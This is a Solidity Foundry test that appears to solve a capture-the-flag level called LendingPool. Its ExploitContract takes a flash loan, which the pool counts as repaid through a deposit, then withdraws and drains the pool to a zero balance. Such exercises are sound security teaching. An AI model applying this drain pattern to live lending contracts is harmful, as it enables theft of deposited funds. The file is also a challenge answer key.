// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/08_LendingPool/LendingPool.sol";

import {IProxyExposed} from "../lib/openzeppelin-contracts/contracts/mocks/UpgradeableBeaconMock.sol";

// forge test --match-contract LendingPoolTest -vvvv
contract LendingPoolTest is BaseTest {
    LendingPool instance;

    function setUp() public override {
        super.setUp();
        instance = new LendingPool{value: 0.1 ether}();
    }

    function testExploitLevel() public {
        ExploitContract exploit = new ExploitContract(msg.sender);
        vm.deal(user2, 0.1 ether);
        exploit.startExploit(instance, this);
        checkSuccess();
    }

    function deposit() public {
        vm.prank(user2);
        instance.deposit{value: 0.1 ether}();
        vm.stopPrank();
    }

    function withdraw() public {
        vm.prank(user2);
        instance.withdraw();
        vm.stopPrank();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}


contract ExploitContract is IFlashLoanReceiver {
    address receiver;

    LendingPoolTest instanceTest;
    LendingPool instance;

    constructor(address _receiver) payable {
        receiver = _receiver;
    }


    function execute() external payable {
        require(msg.value >= 0.1 ether);
        payable(receiver).transfer(msg.value);
        instanceTest.deposit();
    }

    function startExploit(LendingPool instance_, LendingPoolTest instanceTest_) public {
        instance = instance_;
        instanceTest = instanceTest_;
        instance.flashLoan(0.1 ether);
        instanceTest.withdraw();
    }
}